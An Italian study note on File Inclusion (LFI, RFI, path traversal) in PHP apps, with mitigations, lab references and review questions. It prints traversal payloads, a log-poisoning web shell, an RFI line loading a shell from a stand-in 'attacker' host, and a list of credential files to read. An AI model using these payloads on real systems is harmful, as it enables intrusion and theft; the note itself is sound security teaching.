---
tipo: concetto
tag: [web, owasp]
fase: 2
fonti: 3
aggiornato: 2026-07-02
stato: maturo
aliases: ["File Inclusion (LFI e RFI)", "LFI", "RFI", "Path Traversal"]
---

# File Inclusion (LFI e RFI)

> **Nota etica**: praticare solo su lab autorizzati (PortSwigger Academy, DVWA, TryHackMe).

## In breve
Le vulnerabilità di **File Inclusion** nascono quando l'app include/legge un file in base a input utente non sanificato. **LFI** (Local File Inclusion) legge file locali del server; **RFI** (Remote File Inclusion) include ed esegue un file remoto → RCE. Il cugino è il **Path Traversal** (`../`) che legge file fuori dalla cartella prevista. Categoria **A03** dell'[[OWASP Top 10]].

## Codice vulnerabile tipico
```php
$pagina = $_GET['page'];
include($pagina . '.php');     // include controllato dall'utente
```

## LFI — dal leak alla shell
```
?page=../../../../etc/passwd            lettura file (path traversal)
?page=....//....//etc/passwd            bypass se "../" è filtrato una volta
?page=../../../etc/passwd%00            null byte (PHP < 5.3) tronca ".php"
```
**Salire di livello** da semplice lettura a RCE:
- **PHP wrapper** per leggere il sorgente (non eseguito):
  `?page=php://filter/convert.base64-encode/resource=config` → decodifichi il base64.
- **`data://` / `php://input`**: `?page=data://text/plain;base64,<PHP in base64>` → esecuzione.
- **Log poisoning**: inietti `<?php system($_GET[c]);?>` nell'header `User-Agent` (finisce in `access.log`), poi `?page=/var/log/apache2/access.log&c=id`.
- **LFI + [[Vulnerabilita Upload File|upload]]**: carichi un'immagine con payload PHP, poi la includi via LFI.

## RFI — RCE diretta
Richiede `allow_url_include=On` (off di default dopo PHP 5.2):
```
?page=http://attacker/shell.txt        scarica ed esegue → RCE immediata
```

## File interessanti (cheat rapido)
```
Linux:  /etc/passwd  /etc/shadow  /etc/hosts  ~/.ssh/id_rsa  /var/log/auth.log
        /proc/self/environ   /proc/self/cmdline
Windows: C:\Windows\System32\drivers\etc\hosts   C:\Windows\win.ini
        C:\inetpub\logs\...   <web.config>
App:    config.php  .env  wp-config.php  settings.py
```

## Mitigazione (priorità)
1. **Mai input utente nel path**: usa una **allowlist** id→file (`1→home.php`) mappata nel codice.
2. **Canonicalizza** con `realpath()` e verifica che resti dentro la base dir; `basename()` sull'input.
3. `open_basedir`, **disabilita `allow_url_include`/`allow_url_fopen`**.
4. PHP aggiornato (chiude null byte e bug di wrapper).

## Lab
- [[PortSwigger Web Academy]] → categoria **Path traversal** (directory traversal). Percorso dal livello APPRENTICE:
  - *File path traversal, simple case* — leggere `/etc/passwd` con `../` non filtrati.
  - *...traversal sequences blocked with absolute path bypass* e *...stripped non-recursively* (`....//`) — praticare i bypass dei filtri elencati sopra.
  - *...validation of start of path* e *...with a null byte bypass* (`%00`) — casi di canonicalizzazione parziale.
- TryHackMe → room *File Inclusion* (percorso Jr Penetration Tester): esercita LFI, RFI, PHP wrapper (`php://filter`, `data://`) e **log poisoning** fino alla RCE.
- Cosa esercitare: passare dalla semplice lettura file alla shell (log poisoning + [[Vulnerabilita Upload File|upload]]), usando [[Burp Suite]] Repeater.

## Domande
1. **D:** Qual è la differenza tra LFI e RFI?  **R:** LFI include/legge un file **locale** del server (spesso solo lettura o via wrapper→RCE); RFI include ed esegue un file **remoto** controllato dall'attaccante, dando RCE diretta ma richiede `allow_url_include=On`.
2. **D:** Come si passa da una semplice lettura file (LFI) all'esecuzione di codice?  **R:** Con PHP wrapper `data://`/`php://input`, con il **log poisoning** (inietto PHP nell'`User-Agent`, poi includo `access.log`), o combinando LFI con un file caricato via upload.
3. **D:** A cosa serve il wrapper `php://filter/convert.base64-encode`?  **R:** A leggere il **sorgente** di un file PHP senza eseguirlo: il codice viene restituito in base64, che poi si decodifica per ispezionare configurazioni e credenziali.
4. **D:** Perché `....//` a volte aggira un filtro su `../`?  **R:** Se il filtro rimuove `../` una sola volta e in modo non ricorsivo, da `....//` resta `../` dopo la rimozione, ripristinando il traversal.
5. **D:** Qual è la mitigazione più solida contro la File Inclusion?  **R:** Non mettere mai input utente nel path: usare un'allowlist id→file mappata nel codice, più canonicalizzazione con `realpath()` verificando che resti dentro la base dir.

## Collegamenti
- [[OWASP Top 10]]
- [[Command Injection]]
- [[Vulnerabilita Upload File]]
- [[Security Misconfiguration]]
- [[Permessi Linux]]
- [[Reverse Shell e Bind Shell]]
- [[Burp Suite]]
- [[PortSwigger Web Academy]]

## Fonti
- HackTricks — File Inclusion / Path Traversal: https://book.hacktricks.xyz/pentesting-web/file-inclusion
- OWASP WSTG — Testing for LFI: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
- PortSwigger — Directory Traversal: https://portswigger.net/web-security/file-path-traversal
